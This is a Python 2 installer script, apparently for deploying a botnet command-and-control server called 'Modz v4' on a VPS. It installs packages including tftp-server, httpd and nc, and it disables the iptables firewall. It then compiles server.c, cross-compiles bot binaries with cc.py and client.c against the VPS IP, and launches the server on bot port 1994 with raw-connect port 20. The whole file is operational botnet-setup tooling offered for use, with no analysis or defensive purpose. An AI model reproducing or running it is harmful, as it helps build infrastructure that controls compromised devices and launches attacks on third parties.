import subprocess,os,sys,random,time,urllib2,subprocess
#!/usr/bin/env python
 
# 7/18/2018
# wriiten by slumpthegod
# Jamming to Juicywrld
 
def run(cmd):
    subprocess.call(cmd, shell=True)
 
print("\x1b[0;32m[\x1b[0;31m!\x1b[0;32m]Installing Dependicies\x1b[0;31m...\x1b[0m")
time.sleep(5)
print("\x1b[0;31m[\x1b[0;32mSIDE NOTE\x1b[0;31m]\x1b[0;32mMake sure everything in the Modz v4 folder is in the vps\x1b[0;31m...\x1b[0m")
time.sleep(5)
print("\x1b[0;32mStarting\x1b[0;31m...\x1b[0m")
time.sleep(5)
print("\x1b[0;32Installing\x1b[0;31m...\x1b[0m")
run("yum update -y")
run("yum install gcc python-paramiko -y")
run("yum install python nano gcc wget screen -y")
run("yum install nano -y")
run("yum install cpan perl python python-paramiko gcc nano wget nc screen psmisc bzip2 -y")
run("yum install epel-release -y")
run("yum install gmp-devel -y")
run("ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10")
run("yum install screen wget bzip2 gcc gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y")
run("service iptables stop")
run("chkconfig iptables off")
print("\x1b[0;32mDEPENDICIES HAVE BEEN INSTALLED\x1b[0;31m...\x1b[0m")
time.sleep(5)
print("\x1b[0;32mMake your login\x1b[0;31m...\x1b[0m")
time.sleep(5)
run("nano login.txt")
time.sleep(5)
print("\x1b[0;32mLOGIN SUCCESSFULLY MADE\x1b[0;31m...\x1b[0m")
time.sleep(5)
run("gcc -o server server.c -pthread")
print("\x1b[0;32mNO \x1b[0;31mERRORS\x1b[0;32m? EVERYTHING SHOULD BE FINE HERE\x1b[0;31m...\x1b[0m")
time.sleep(5)
print("\x1b[0;32mPlease wait\x1b[0;31m...\x1b[0m")
time.sleep(5)
print("\x1b[0;32mits gonna ask you to Enter option do 1 and enter\x1b[0m")
option = input ("Enter Option: ")
if option == 1:
    print ("\x1b[0;32mCompling archs...")
    time.sleep(2)
    cc = raw_input("\x1b[0;32mTYPE python: ")
    ccfile = raw_input("\x1b[0;32mTYPE cc.py: ")
    client = raw_input("\x1b[0;32mTYPE client.c: ")
    ip = raw_input("\x1b[0;32mVPS IP HERE: ");
    run (""+cc+" "+ccfile+" "+client+" "+ip+"")
time.sleep(5)
time.sleep(5)
print("\x1b[0;32mNow that we got the bins...\x1b[0m")
time.sleep(5)
print("\x1b[0;32m!!!!! ITS GONNA SCREEN YOUR SERVER ON BOTPORT 1994\x1b[0m")
time.sleep(5)
print("\x1b[0;32m!!!!! ITS GONNA SCREEN YOUR SERVER ON BOTPORT 1994\x1b[0m")
time.sleep(5)
print("\x1b[0;32mCTRL Z IF YOU DONT WANT IT TO\x1b[0m")
print("\x1b[0;32mscreen ./server 1994 500 20\x1b[0m")
time.sleep(5)
print("\x1b[0;32mATTENTION YOUR RAW CONNECT PORT IS GONNA BE 20\x1b[0m")
time.sleep(5)
print("\x1b[0;31m3\x1b[0m")
time.sleep(5)
print("\x1b[0;34m2\x1b[0m")
time.sleep(5)
print("\x1b[0;33m1\x1b[0m")
time.sleep(5)
run("screen ./server 1994 500 20")